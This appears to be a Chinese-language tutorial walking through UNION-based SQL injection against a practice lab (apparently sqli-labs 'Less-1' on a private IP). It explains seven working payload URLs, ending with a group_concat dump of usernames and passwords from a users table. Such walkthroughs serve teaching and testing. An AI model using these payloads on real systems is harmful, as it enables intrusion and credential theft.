攻击过程一般分为以下几个步骤：

1. **测试SQL注入漏洞**：通过插入简单的SQL代码，确认是否存在注入漏洞。
2. **确定查询的列数**：通过`ORDER BY`或`UNION`来确定数据库查询中返回的列数。
3. **获取数据库信息**：通过查询数据库名称、版本等基本信息来了解数据库环境。
4. **获取表和列信息**：通过查询`information_schema`等系统表，获取数据库中的表和列信息。
5. **提取敏感数据**：最终，通过`GROUP_CONCAT`等函数获取敏感数据，如用户名、ID、密码等。

详细过程如下：

### 1. **`http://10.16.2.3:8081/Less-1/?id=1' order by 3 --+`**

**攻击目的：** 测试是否存在SQL注入漏洞。

- **`id=1'`**：这个部分插入了一个闭合单引号（`'`），它试图结束掉原始的SQL语句，并引入新的SQL代码。通常，应用程序在执行查询时会拼接SQL语句，如果没有进行正确的参数化处理，注入攻击会成功。
- **`order by 3`**：这是尝试通过SQL语句的`ORDER BY`子句来确定数据库中有多少列。这里`3`表示按第3列排序。如果数据库表中没有第3列，SQL会报错，攻击者可以通过调整这个数字来确定实际列数。
- **`--+`**：这是SQL的注释符号。`--`表示注释的开始，`+`用于在URL编码中确保其作为注释符号被正确传递。它会将`ORDER BY 3`后面的内容视为注释，从而防止SQL语句后续的部分执行。

**攻击目标：** 测试系统是否容易受SQL注入影响，并尝试找出数据库查询中包含的列数。

------

### 2. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,3 --+`**

**攻击目的：** 通过`UNION`查询来获取数据库的更多信息。

- **`id=-1'`**：与上一步类似，注入了一个闭合单引号（`'`）来结束原本的查询。
- **`union select 1,2,3`**：`UNION`用于将两个`SELECT`查询的结果合并。在这种情况下，攻击者尝试返回3列的查询结果。前两个列（`1`和`2`）是占位符，而第三个列（`3`）可以是其他数据。如果这个查询成功，则说明数据库查询的列数至少是3。
- **`--+`**：注释符号，防止SQL查询后续部分的执行。

**攻击目标：** 确认SQL查询中能返回的列数，并为进一步的注入操作做好准备。

------

### 3. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,database(),version() --+`**

**攻击目的：** 获取数据库的基本信息。

- `union select 1,database(),version()`

  ：这部分查询尝试通过

  ```
  UNION
  ```

  查询获取两个数据库信息：

  - `1`：一个占位符。
  - `database()`：一个SQL函数，返回当前使用的数据库名称。
  - `version()`：一个SQL函数，返回数据库的版本信息。

通过这种方式，攻击者可以获取有关数据库的名称和版本等敏感信息。

------

### 4. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+`**

**攻击目的：** 获取数据库中表的名称。

- **`group_concat(table_name)`**：`group_concat`是一个SQL聚合函数，允许将多个结果行连接成一个单一的字符串。在这里，攻击者试图从`information_schema.tables`中获取所有表名，并将它们连接成一个字符串。
- **`where table_schema='security'`**：这是一个条件子句，限定了查询的范围，只获取数据库`security`中的表信息。`information_schema.tables`是一个系统表，包含了数据库中所有表的元数据。

**攻击目标：** 获取目标数据库中所有表的名称。

------

### 5. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`**

**攻击目的：** 获取某个表（例如`users`表）中的列名称。

- **`group_concat(column_name)`**：类似于上一步，攻击者尝试通过`group_concat`获取`users`表中的所有列名，并将它们连接成一个字符串。
- **`where table_name='users'`**：这个条件子句指定了只查询`users`表的列信息。

**攻击目标：** 获取`users`表中所有列的名称。

------

### 6. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,id , password) from users --+`**

**攻击目的：** 获取用户表中的敏感数据（如用户名、ID和密码）。

- **`group_concat(username ,id , password)`**：攻击者试图获取`users`表中的`username`（用户名）、`id`（用户ID）和`password`（用户密码）字段的值，并将它们连接成一个字符串。

**攻击目标：** 获取`users`表中的所有用户信息（用户名、ID和密码）。这些数据对于进一步的攻击（如登陆攻击）非常有价值。

------

### 7. **`http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,'-',id,'-' , password) from users --+`**

**攻击目的：** 改进之前的注入，获取数据格式化后输出。

- **`group_concat(username ,'-',id,'-' , password)`**：这里，攻击者使用`'-'`作为分隔符来格式化输出数据。相比之前的查询，这种格式的输出更容易在后续处理中解析（例如，分割用户名、ID和密码）。

**攻击目标：** 以更易读或可解析的格式获取`users`表中的敏感数据（用户名、ID和密码）。